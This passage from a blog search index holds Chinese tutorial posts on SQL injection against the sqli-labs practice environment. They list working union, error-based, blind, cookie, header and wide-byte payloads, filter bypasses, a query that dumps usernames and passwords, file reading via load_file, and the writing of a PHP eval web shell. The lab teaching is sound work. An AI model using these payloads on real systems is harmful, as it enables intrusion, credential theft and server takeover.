language-shell" data-language="shell"><code class="language-shell">--invalid-bignum<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用布尔操作(如id=1 and 1=2)</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--invalid-logical<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用随机字符串(如id=abc)</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--invalid-string<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap </tag>
            
            <tag> 渗透工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于sqli_lab的sql注入详解(二)</title>
      <link href="/2020/03/16/mysql-injection-2/"/>
      <url>/2020/03/16/mysql-injection-2/</url>
      
        <content type="html"><![CDATA[<h2 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><blockquote><p>程序中设置了过滤关键字，但没有对关键字组成深入分析过滤，可以通过修改关键字内字母大小写来绕过过滤措施。<br>如：AnD 1=1 （将某些字母大写）</p></blockquote><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><blockquote><p>在程序中设置出现关键字之后替换为空，可以双写绕过<br>uniunionOn(也可结合大小写绕过使用)</p></blockquote><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><blockquote><p>利用URL编码绕过过滤机制</p></blockquote><h3 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">/*!select * from admin*/</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="POST基于时间的盲注"><a href="#POST基于时间的盲注" class="headerlink" title="POST基于时间的盲注"></a>POST基于时间的盲注</h2><h3 id="以less-15为例"><a href="#以less-15为例" class="headerlink" title="以less-15为例"></a>以less-15为例</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f2.png"></p><h3 id="输入表单，然后使用burp抓包，在注入点添加注入语句，可以看到延时效果"><a href="#输入表单，然后使用burp抓包，在注入点添加注入语句，可以看到延时效果" class="headerlink" title="输入表单，然后使用burp抓包，在注入点添加注入语句，可以看到延时效果"></a>输入表单，然后使用burp抓包，在注入点添加注入语句，可以看到延时效果</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f1.png"></p><hr><h2 id="POST基于布尔的盲注"><a href="#POST基于布尔的盲注" class="headerlink" title="POST基于布尔的盲注"></a>POST基于布尔的盲注</h2><h3 id="还是以less-15为例，在注入点添加注入语句，真则返回flag-jpg-假则返回slap-jpg"><a href="#还是以less-15为例，在注入点添加注入语句，真则返回flag-jpg-假则返回slap-jpg" class="headerlink" title="还是以less-15为例，在注入点添加注入语句，真则返回flag.jpg,假则返回slap.jpg"></a>还是以less-15为例，在注入点添加注入语句，真则返回flag.jpg,假则返回slap.jpg</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f3.png"><br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f4.png"></p><hr><h2 id="HTTP头中的SQL注入"><a href="#HTTP头中的SQL注入" class="headerlink" title="HTTP头中的SQL注入"></a>HTTP头中的SQL注入</h2><h3 id="产生原理"><a href="#产生原理" class="headerlink" title="产生原理"></a>产生原理</h3><blockquote><p>看一下源码<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f5.png"><br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f6.png"><br>未对HTTP头的变量过滤，导致注入漏洞产生<br>可以在参数最后加入\，测试漏洞是否存在</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f9.png"><br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f10.png"> </p><h3 id="利用一个报错函数updatexml构造payload"><a href="#利用一个报错函数updatexml构造payload" class="headerlink" title="利用一个报错函数updatexml构造payload"></a>利用一个报错函数updatexml构造payload</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http">' and updatexml(1,concat(0x3a,(select version()),0x3a),1) or '1'='1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f7.png"><br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f8.png">   </p><hr><h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><h3 id="以less-20为例，首先抓到HTTP包，然后进行重定向"><a href="#以less-20为例，首先抓到HTTP包，然后进行重定向" class="headerlink" title="以less-20为例，首先抓到HTTP包，然后进行重定向"></a>以less-20为例，首先抓到HTTP包，然后进行重定向</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f11.png">  </p><h3 id="然后将包forward，抓到含有cookie注入漏洞的包"><a href="#然后将包forward，抓到含有cookie注入漏洞的包" class="headerlink" title="然后将包forward，抓到含有cookie注入漏洞的包"></a>然后将包forward，抓到含有cookie注入漏洞的包</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f12.png">   </p><h3 id="构造Payload"><a href="#构造Payload" class="headerlink" title="构造Payload"></a>构造Payload</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f13.png"></p><hr><h2 id="绕过去除注释符的sql注入"><a href="#绕过去除注释符的sql注入" class="headerlink" title="绕过去除注释符的sql注入"></a>绕过去除注释符的sql注入</h2><h3 id="以less-23为例，可以看到对id参数进行了去除注释符的过滤"><a href="#以less-23为例，可以看到对id参数进行了去除注释符的过滤" class="headerlink" title="以less-23为例，可以看到对id参数进行了去除注释符的过滤"></a>以less-23为例，可以看到对id参数进行了去除注释符的过滤</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f14.png">  </p><h3 id="可以通过or-‘1’-’1-的方式去闭合右边的引号部分，从而达到绕过效果"><a href="#可以通过or-‘1’-’1-的方式去闭合右边的引号部分，从而达到绕过效果" class="headerlink" title="可以通过or ‘1’=’1  的方式去闭合右边的引号部分，从而达到绕过效果"></a>可以通过or ‘1’=’1  的方式去闭合右边的引号部分，从而达到绕过效果</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//192.168.0.104/sqli/Less-23/?id=-1' union select 1,database(),'3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="返回结果"><a href="#返回结果" class="headerlink" title="返回结果"></a>返回结果</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f15.png">  </p><hr><h2 id="绕过过滤and和or的注入"><a href="#绕过过滤and和or的注入" class="headerlink" title="绕过过滤and和or的注入"></a>绕过过滤and和or的注入</h2><h3 id="对于mysql，关键字和符号是等价的，如-color-red-and-和-color-red-amp-amp-color-red-or-和-color-red"><a href="#对于mysql，关键字和符号是等价的，如-color-red-and-和-color-red-amp-amp-color-red-or-和-color-red" class="headerlink" title="对于mysql，关键字和符号是等价的，如 $\color{red}{and}$ 和 $\color{red}{&amp;&amp;}$,$\color{red}{or}$ 和 $\color{red}{|}$"></a>对于mysql，关键字和符号是等价的，如 $\color{red}{and}$ 和 $\color{red}{&amp;&amp;}$,$\color{red}{or}$ 和 $\color{red}{|}$</h3><h3 id="以less-25为例"><a href="#以less-25为例" class="headerlink" title="以less-25为例"></a>以less-25为例</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f16.png">   </p><h3 id="改变大小写发现无效"><a href="#改变大小写发现无效" class="headerlink" title="改变大小写发现无效"></a>改变大小写发现无效</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//192.168.0.104/sqli/Less-25/?id=1'  And 1=1--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f17.png"></p><h3 id="双写绕过和-都可以"><a href="#双写绕过和-都可以" class="headerlink" title="双写绕过和||都可以"></a>双写绕过和||都可以</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//192.168.0.104/sqli/Less-25/?id=1'  || 1=1--+<span class="token header-name keyword">http:</span>//192.168.0.104/sqli/Less-25/?id=1'  anandd 1=1--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f18.png"></p><hr><h2 id="绕过去除空格的注入"><a href="#绕过去除空格的注入" class="headerlink" title="绕过去除空格的注入"></a>绕过去除空格的注入</h2><h3 id="以less-26为例，对于去除空格的情况，可以采用URL编码或16进制进行绕过-空格可用-20，-09，-0a等"><a href="#以less-26为例，对于去除空格的情况，可以采用URL编码或16进制进行绕过-空格可用-20，-09，-0a等" class="headerlink" title="以less-26为例，对于去除空格的情况，可以采用URL编码或16进制进行绕过,空格可用%20，%09，%0a等"></a>以less-26为例，对于去除空格的情况，可以采用URL编码或16进制进行绕过,空格可用%20，%09，%0a等</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f19.png"></p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//192.168.0.104/sqli/Less-26/?id=1'%20||'1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f20.png"></p><hr><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h3 id="产生原理-1"><a href="#产生原理-1" class="headerlink" title="产生原理"></a>产生原理</h3><blockquote><p>GBK每个字符2个字节，ASCII每个字符1个字节<br>PHP中编码为GBK，函数执行为ASCII，mysql默认字符集是GBK等宽字节字符集<br>%DF’会被PHP中的$\color{red}{addslashes}$函数转义为“%DF\‘”,”\“是URL里的“%5C”,那么“%DF’”会被转义成“%DF%5C%27”(%27是引号)，倘若网站字符集是GBK，Mysql使用的编码也是GBK的话，就会认为“%DF%5C%27”是一个宽字符</p></blockquote><h3 id="以less-33为例"><a href="#以less-33为例" class="headerlink" title="以less-33为例"></a>以less-33为例</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f21.png"></p><h3 id="构造Payload-1"><a href="#构造Payload-1" class="headerlink" title="构造Payload"></a>构造Payload</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//192.168.0.100/sqli/less-33/?id=-1%df' union select 1,version(),database() --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f22.png"></p><blockquote><p>最常用的是使用%df，其实只要第一个ASCII码大于128即可，如ASCII码为129的就可以，先将129转化为16进制，0x81，然后在前面加%即可，即为%81<br>GBK首字节对应0x81-0xfe，尾字节对应0x40-0xfe(除0x7f)</p></blockquote><h3 id="如less-32"><a href="#如less-32" class="headerlink" title="如less-32"></a>如less-32</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f23.png">   </p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//192.168.0.100/sqli/less-32/?id=-1%81' union select 1,version(),database() --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f24.png">   </p><hr><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="以less-24为例，没有对username变量进行过滤"><a href="#以less-24为例，没有对username变量进行过滤" class="headerlink" title="以less-24为例，没有对username变量进行过滤"></a>以less-24为例，没有对username变量进行过滤</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f29.png"></p><h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f25.png"><br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f26.png"><br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f27.png"><br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f28.png"> </p><hr><h2 id="再介绍一个报错函数extractvalue"><a href="#再介绍一个报错函数extractvalue" class="headerlink" title="再介绍一个报错函数extractvalue"></a>再介绍一个报错函数extractvalue</h2><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection2_f30.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql_injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于sqli_lab的sql注入详解(一)</title>
      <link href="/2020/03/15/mysql-injection-1/"/>
      <url>/2020/03/15/mysql-injection-1/</url>
      
        <content type="html"><![CDATA[<h2 id="mysql的目录结构"><a href="#mysql的目录结构" class="headerlink" title="mysql的目录结构"></a>mysql的目录结构</h2><p>mysql 5.0以上的版本中，默认定义了information_schema数据库，其中包含有表schemata(数据库名)、tables、columns(列名)</p><table><thead><tr><th align="center">表名</th><th align="center">含有重要列名</th></tr></thead><tbody><tr><td align="center">schemata</td><td align="center">schema_name</td></tr><tr><td align="center">tables</td><td align="center">table_schema, table_name</td></tr><tr><td align="center">columns</td><td align="center">table_schema, table_name, column_name</td></tr></tbody></table><hr><h2 id="基于报错的SQL注入"><a href="#基于报错的SQL注入" class="headerlink" title="基于报错的SQL注入"></a>基于报错的SQL注入</h2><h3 id="以less-1为例"><a href="#以less-1为例" class="headerlink" title="以less-1为例"></a>以less-1为例</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f1.png">   </p><h3 id="这里提示输入ID作为参数值，那输入一下试试看"><a href="#这里提示输入ID作为参数值，那输入一下试试看" class="headerlink" title="这里提示输入ID作为参数值，那输入一下试试看"></a>这里提示输入ID作为参数值，那输入一下试试看</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-1/?id=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="返回结果1"><a href="#返回结果1" class="headerlink" title="返回结果1"></a>返回结果1</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f2.png"></p><h3 id="Less-1已经指出是error-based-single-quotes-所以直接加单引号尝试报错注入"><a href="#Less-1已经指出是error-based-single-quotes-所以直接加单引号尝试报错注入" class="headerlink" title="Less-1已经指出是error based-single quotes,所以直接加单引号尝试报错注入"></a>Less-1已经指出是error based-single quotes,所以直接加单引号尝试报错注入</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-1/?id=1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="返回结果2"><a href="#返回结果2" class="headerlink" title="返回结果2"></a>返回结果2</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f3.png">  </p><blockquote><p><strong>‘’1’’ LIMIT 0,1’</strong><br>观察报错语句，去掉最外层的引号，它是将从sql查询语句错误的地方开始用引号引起来，到语句结束处引号结束<br>去掉引号之后，变为 <strong>‘1’’ LIMIT 0,1</strong><br>我们对ID的赋值为  <strong>1’</strong><br>所以可以猜到查询语句对ID的查询是单引号包起来<br>这里可以看一下PHP源码<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f4.png"><br>可以看出ID确实是被单引号包裹起来的  </p></blockquote><h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><ol><li><p>检测字段数  </p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-1/?id=1' order by 3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>order by 3 返回正确结果</li><li>order by 4 返回错误</li><li>所以为3个字段  </li></ul><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f5.png">  </p></li><li><p>检测当前数据库的表名</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-1/?id=-1' union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>因为前面检测出了3个字段，所以Union select 1,2,3</li><li>$\color{red}{返回结果}$<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f6.png"> </li><li>可以看出数字2和3在页面显示出来了，所以选择在2或者3上注入</li></ul><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-1/?id=-1' UNION SELECT 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>使用union select语句要注意$\color{red}{前面的条件不能成立，可赋id=-1}$</li><li>$\color{red}{返回结果}$<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f7.png"></li></ul></li><li><p>检测某一个表的列名</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-1/?id=-1' UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>记得表名要加单引号包裹起来</li><li>$\color{red}{返回结果}$<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f8.png"></li></ul></li></ol><ol start="4"><li><p>爆出整个表或某几个想要的列</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-1/?id=-1' UNION ALL SELECT 1,group_concat(username,0x3a,password),3 from users --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>0x3a表示引号，可以分开用户名和密码</li><li>$\color{red}{返回结果}$<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f9.png"></li></ul></li></ol><hr><h2 id="关于mysql的注释"><a href="#关于mysql的注释" class="headerlink" title="关于mysql的注释"></a>关于mysql的注释</h2><h3 id="常见注释符"><a href="#常见注释符" class="headerlink" title="常见注释符"></a>常见注释符</h3><ul><li>#或–+或/**/ </li></ul><h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><ul><li>在注释的开头处加上！便可执行mysql语句，只对mysql有效，常用来绕过WAF<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f10.png"><br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f11.png"></li></ul><hr><h2 id="基于时间的延时注入"><a href="#基于时间的延时注入" class="headerlink" title="基于时间的延时注入"></a>基于时间的延时注入</h2><h3 id="以less-9为例"><a href="#以less-9为例" class="headerlink" title="以less-9为例"></a>以less-9为例</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f12.png"> </p><ul><li>测试id参数发现不管是否加引号都会返回相同的结果，所以无法使用报错注入</li><li>这里可以看一下PHP源码<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f14.png">  </li></ul><h3 id="利用if语句，若真则返回1，若假则延时3s"><a href="#利用if语句，若真则返回1，若假则延时3s" class="headerlink" title="利用if语句，若真则返回1，若假则延时3s"></a>利用if语句，若真则返回1，若假则延时3s</h3><p>$\color{red}{真，时间为2s左右}$  </p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-9/?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(3)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f13.png"><br>$\color{red}{假，时间为5s左右}$  </p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-9/?id=1' and if(ascii(substr(database(),1,1))=116,1,sleep(3)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f15.png">   </p><blockquote><ul><li>注意payload要加and</li></ul></blockquote><hr><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="以less-8为例"><a href="#以less-8为例" class="headerlink" title="以less-8为例"></a>以less-8为例</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-8/?id=1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>加单引号发现错误界面<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f16.png"> </li></ul><h3 id="利用返回的布尔值注入"><a href="#利用返回的布尔值注入" class="headerlink" title="利用返回的布尔值注入"></a>利用返回的布尔值注入</h3><h4 id="返回错误界面"><a href="#返回错误界面" class="headerlink" title="返回错误界面"></a>返回错误界面</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-8/?id=1' and length(database()) &lt; 8 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="返回正确界面"><a href="#返回正确界面" class="headerlink" title="返回正确界面"></a>返回正确界面</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-8/?id=1' and length(database()) &lt; 9 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="从而确定length-database-8"><a href="#从而确定length-database-8" class="headerlink" title="从而确定length(database())=8"></a>从而确定length(database())=8</h4><hr><h2 id="mysql读文件"><a href="#mysql读文件" class="headerlink" title="mysql读文件"></a>mysql读文件</h2><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><ul><li>权限够高</li><li>secure_file_priv不为NULL，需要通过my.ini修改<blockquote><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f17.png"><br>$\color{red}{设置为空格即可}$<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f18.png"><br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f19.png"></p></blockquote></li></ul><h3 id="以less-1为例进行读文件"><a href="#以less-1为例进行读文件" class="headerlink" title="以less-1为例进行读文件"></a>以less-1为例进行读文件</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-1/?id=-1' union select 1,load_file('F:\\flag.txt'),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f20.png"></p><hr><h2 id="mysql写文件"><a href="#mysql写文件" class="headerlink" title="mysql写文件"></a>mysql写文件</h2><h3 id="前提-1"><a href="#前提-1" class="headerlink" title="前提"></a>前提</h3><ul><li>权限够高</li><li>设置变量general_log为ON<blockquote><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f21.png"></p></blockquote></li></ul><h3 id="以less-7为例"><a href="#以less-7为例" class="headerlink" title="以less-7为例"></a>以less-7为例</h3><h4 id="正确界面"><a href="#正确界面" class="headerlink" title="正确界面"></a>正确界面</h4><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f22.png"></p><h4 id="反复增加引号或括号个数，尝试闭合参数id，最后得出正确界面"><a href="#反复增加引号或括号个数，尝试闭合参数id，最后得出正确界面" class="headerlink" title="反复增加引号或括号个数，尝试闭合参数id，最后得出正确界面"></a>反复增加引号或括号个数，尝试闭合参数id，最后得出正确界面</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-7/?id=1')) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="可以写入一句话，然后使用蚁剑连接"><a href="#可以写入一句话，然后使用蚁剑连接" class="headerlink" title="可以写入一句话，然后使用蚁剑连接"></a>可以写入一句话，然后使用蚁剑连接</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-7/?id=-1')) union select 1,2,'&lt;?php eval($_POST["ezy"]);?>' into outfile "F:\\phpstudy_pro\\PHPTutorial\\WWW\\sqli\\Less-7\\1.php" --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f23.png"></p><hr><h2 id="mysql报错注入"><a href="#mysql报错注入" class="headerlink" title="mysql报错注入"></a>mysql报错注入</h2><h3 id="以less-5为例"><a href="#以less-5为例" class="headerlink" title="以less-5为例"></a>以less-5为例</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f24.png"></p><h3 id="利用-floor-rand-group-by进行报错注入"><a href="#利用-floor-rand-group-by进行报错注入" class="headerlink" title="利用 floor(),rand(),group by进行报错注入"></a>利用 floor(),rand(),group by进行报错注入</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//192.168.0.104/sqli/Less-5/?id=0' union select 1,2,count(*)  from information_schema.columns group by concat((select table_name from information_schema.tables where table_schema = database() limit 3,1),0x3a,floor(rand(0)*2)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li>注意只能返回一行数据，所以使用limit</li></ul></blockquote><h4 id="返回结果"><a href="#返回结果" class="headerlink" title="返回结果"></a>返回结果</h4><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f25.png"></p><blockquote><ul><li>通过改变payload爆出其他数据</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql_injection </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
